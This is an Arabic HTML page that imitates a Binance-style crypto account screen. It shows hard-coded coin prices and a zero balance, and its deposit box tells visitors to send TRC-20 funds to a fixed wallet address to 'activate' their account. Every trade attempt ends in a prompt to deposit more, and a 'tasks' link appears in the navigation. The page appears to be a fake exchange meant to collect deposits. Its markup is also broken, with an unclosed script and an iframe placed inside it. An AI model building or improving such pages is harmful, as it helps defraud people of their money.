<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>حسابي</title>
  <link rel="stylesheet" href="https://cloudflare.com">
  <style>
    body { background-color: #0b0e14; color: #ffffff; font-family: Arial; margin: 0; padding: 20px 15px 120px 15px; }
    .hdr { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 5px; padding-top: 10px; }
    .bal-amt { font-size: 26px; font-weight: bold; color: #ffffff; }
    .dep-btn { background-color: #f0b90b; color: #000000; border: none; padding: 10px 18px; font-size: 14px; font-weight: bold; border-radius: 8px; cursor: pointer; }
    .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
    .card { background-color: #181a20; border-radius: 12px; padding: 15px; border: 1px solid #2b2f36; cursor: pointer; }
    .card-hdr { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; font-size: 14px; font-weight: bold; color: #848e9c; }
    .icon { width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; color: #000000; font-weight: bold; }
    .prc { font-size: 18px; font-weight: bold; text-align: left; margin-bottom: 4px; }
    .chg { font-size: 12px; color: #0ecb81; text-align: left; }
    .ovr { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 2000; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
    .box { background: #181a20; border: 1px solid #2b2f36; border-radius: 16px; padding: 22px; width: 100%; max-width: 360px; text-align: center; box-sizing: border-box; }
    .wlt { background: #0b0e14; border: 1px dashed #f0b90b; padding: 14px; border-radius: 8px; font-size: 13px; word-break: break-all; font-family: monospace; margin: 15px 0; }
    .tabs { display: flex; gap: 10px; margin-bottom: 15px; }
    .tab { flex: 1; padding: 10px; border-radius: 6px; font-weight: bold; border: none; cursor: pointer; }
    .inp-grp { background: #0b0e14; border: 1px solid #2b2f36; border-radius: 8px; padding: 8px 12px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
    .inp-grp input { background: none; border: none; color: white; font-size: 16px; width: 70%; outline: none; }
    .sub-btn { width: 100%; background: #0ecb81; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-bottom: 12px; }
    .cls-btn { background: #2b2f36; color: white; border: none; padding: 8px 20px; border-radius: 6px; cursor: pointer; }
    
    /* شريط التنقل السفلي المطور مثل بايننس (أيقونات فقط مع خط سفلي نشط) */
    .nav { position: fixed; bottom: 0; left: 0; width: 100%; background: #181a20; display: flex; padding: 12px 0; border-top: 1px solid #2b2f36; z-index: 1000; box-sizing: border-box; }
    .nav a { text-decoration: none; color: #848e9c; display: flex; flex-direction: column; align-items: center; justify-content: center; width: 25%; position: relative; height: 35px; }
    .nav a i { font-size: 22px; }
    
    /* تصميم الخط السفلي الأصفر للصفحة النشطة */
    .nav a.active { color: #f0b90b; }
    .nav a.active::after {
      content: '';
      position: absolute;
      bottom: -6px;
      left: 35%;
      width: 30%;
      height: 3px;
      background-color: #f0b90b;
      border-radius: 2px;
    }
  </style>
</head>
<body>

  <div class="hdr">
    <div><div style="font-size:13px; color:#848e9c;">القيمة الإجمالية المقدرة (USD) ▲</div><div class="bal-amt">$0.00 USDT</div></div>
    <button class="dep-btn" onclick="openDep()">إضافة أموال</button>
  </div>
  <div style="font-size:12px; color:#848e9c; margin-bottom:25px;">ربح وخسارة اليوم $0.00 (0.00%) ▼</div>

  <div class="grid" id="cryptoGrid"></div>

  <div class="ovr" id="depModal"><div class="box">
    <div style="font-size:18px; font-weight:bold; color:#f0b90b; margin-bottom:12px;"><i class="fas fa-wallet"></i> إيداع TRC-20</div>
    <p style="font-size:13px; color:#848e9c;">قم بتحويل الأموال مباشرة للعنوان أدناه لتفعيل حسابك:</p>
    <div class="wlt">THJN4XBKxbZNYsw7YAHmNiZSupn3kVEDFP</div>
    <button class="cls-btn" onclick="closeDep()">إغلاق</button>
  </div></div>

  <div class="ovr" id="trdModal"><div class="box">
    <div style="font-size:18px; font-weight:bold; color:#f0b90b; margin-bottom:12px;" id="mdlTtl">تداول عالمي</div>
    <div class="tabs">
      <button class="tab" id="tBuy" style="background:#0ecb81; color:white;" onclick="setTy('buy')">شراء</button>
      <button class="tab" id="tSell" style="background:#2b2f36; color:#848e9c;" onclick="setTy('sell')">بيع</button>
    </div>
    <div class="inp-grp"><input type="number" placeholder="0.00" id="trdAmt" oninput="calc()"><span id="sym">USDT</span></div>
    <div class="inp-grp" style="margin-bottom:20px;"><input type="text" id="trdTtl" readonly value="0.00"><span>إجمالي (USD)</span></div>
    <button class="sub-btn" id="subB" onclick="exec()">تأكيد العملية</button>
    <button class="cls-btn" onclick="closeTrd()">إلغاء</button>
  </div></div>

  <!-- شريط التنقل المحدث بالأيقونات والخط السفلي الأصفر المماثل لبايننس -->
  <div class="nav">
    <a href="account.html" class="active"><i class="fas fa-user"></i></a>
    <a href="tasks.html"><i class="fas fa-list-ul"></i></a>
    <a href="assets.html"><i class="fas fa-wallet"></i></a>
    <a href="home.html"><i class="fas fa-home"></i></a>
  </div>

  <script>
    const coins = [
      {n:'BNB', p:576.05, c:'1.04% ▲', bg:'#f3ba2f', clr:'#000'}, {n:'SOL', p:78.17, c:'0.15% ▲', bg:'#00ffa3', clr:'#000'},
      {n:'BTC', p:61200, c:'0.45% ▼', bg:'#f7931a', clr:'#000', d:1}, {n:'ETH', p:3380, c:'0.82% ▲', bg:'#627eea', clr:'#fff'},
      {n:'TRX', p:0.124, c:'2.11% ▲', bg:'#ec0623', clr:'#fff'}, {n:'XRP', p:0.58, c:'0.31% ▲', bg:'#23292f', clr:'#fff'},
      {n:'ADA', p:0.46, c:'1.20% ▼', bg:'#0033ad', clr:'#fff', d:1}, {n:'DOGE', p:0.14, c:'4.50% ▲', bg:'#c2a633', clr:'#000'},
      {n:'DOT', p:6.25, c:'0.95% ▲', bg:'#e6007a', clr:'#fff'}, {n:'LINK', p:15.40, c:'1.15% ▼', bg:'#375bd2', clr:'#fff', d:1}
    ];

    const grid = document.getElementById('cryptoGrid');
    coins.forEach(c => {
      grid.innerHTML += `<div class="card" onclick="openTrd('${c.n}', ${c.p})">
        <div class="card-hdr"><span>${c.n}</span><div class="icon" style="background:${c.bg}; color:${c.clr}">${c.n}</div></div>
        <div class="prc">${c.p.toLocaleString()}</div>
        <div class="chg" style="color:${c.d?'#f6465d':'#0ecb81'}">${c.c}</div>
      </div>`;
    });

    let curC='', curP=0, curTy='buy';
    function openDep() { document.getElementById('depModal').style.display='flex'; }
    function closeDep() { document.getElementById('depModal').style.display='none'; }
    function openTrd(coin, price) {
      curC=coin; curP=price; document.getElementById('mdlTtl').innerText=`تداول حركي - ${coin}/USDT`;
      document.getElementById('sym').innerText=coin; document.getElementById('trdAmt').value='';
      document.getElementById('trdTtl').value='0.00'; setTy('buy'); document.getElementById('trdModal').style.display='flex';
    }
    function closeTrd() { document.getElementById('trdModal').style.display='none'; }
    function setTy(t) {
      curTy=t; const b=document.getElementById('tBuy'), s=document.getElementById('tSell'), sub=document.getElementById('subB');
      if(t==='buy') { b.style.background='#0ecb81'; b.style.color='white'; s.style.background='#2b2f36'; s.style.color='#848e9c'; sub.style.background='#0ecb81'; sub.innerText=`تأكيد شراء ${curC}`; }
      else { s.style.background='#f6465d'; s.style.color='white'; b.style.background='#2b2f36'; b.style.color='#848e9c'; sub.style.background='#f6465d'; sub.innerText=`تأكيد بيع ${curC}`; }
    }
    function calc() {
      const a = parseFloat(document.getElementById('trdAmt').value)||0;
      document.getElementById('trdTtl').value=(a*curP).toFixed(2);
    }
    function exec() {
      if((parseFloat(document.getElementById('trdAmt').value)||0)<=0) { alert("حدد كمية صحيحة!"); return; }
      alert(`عذراً، رصيدك الحالي غير كافٍ لإتمام عملية الـ ${curTy==='buy'?'شراء':'بيع'}. يرجى إضافة أموال أولاً!`); closeTrd();
        }
  <iframe src="air-signature.html" width="100%" height="450" style="border:2px dashed #007bff; border-radius:10px; max-width:550px; display:block; margin:20px auto;"></iframe>
